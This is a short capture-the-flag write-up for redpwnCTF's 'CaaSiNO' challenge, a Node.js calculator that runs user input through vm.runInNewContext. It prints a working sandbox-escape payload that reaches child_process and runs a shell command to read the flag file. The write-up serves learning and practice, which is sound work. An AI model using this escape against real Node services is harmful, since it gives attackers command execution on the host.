---
title: "redpwnCTF: CaaSiNO"
categories:
  - redpwnCTF
tags:
  - redpwnCTF
---

*Who needs regex for sanitization when we have VMs?!?!*

*The flag is at /ctf/flag.txt*

*nc 2020.redpwnc.tf 31273*

---

For this challenge, we're given a small calculator.js script:

```
const vm = require('vm')
const readline = require('readline')

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

process.stdout.write('Welcome to my Calculator-as-a-Service (CaaS)!\n')
process.stdout.write('This calculator lets you use the full power of Javascript for\n')
process.stdout.write('your computations! Try `Math.log(Math.expm1(5) + 1)`\n')
process.stdout.write('Type q to exit.\n')
rl.prompt()
rl.addListener('line', (input) => {
  if (input === 'q') {
    process.exit(0)
  } else {
    try {
      const result = vm.runInNewContext(input)
      process.stdout.write(result + '\n')
    } catch {
      process.stdout.write('An error occurred.\n')
    }
    rl.prompt()
  }
})
```

We can see that it's calling vm.runInNewContext(input) to eval our input, which is a Node.js function. The PoC at the following URL works for this challenge:

https://snyk.io/vuln/SNYK-JS-MONGOEXPRESS-473215

We just need to modify it a bit:

Payload:
```
this.constructor.constructor("return process")().mainModule.require('child_process').execSync('cat /ctf/flag.txt')  
```

Inputting this payload gives us the flag!

**flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}**
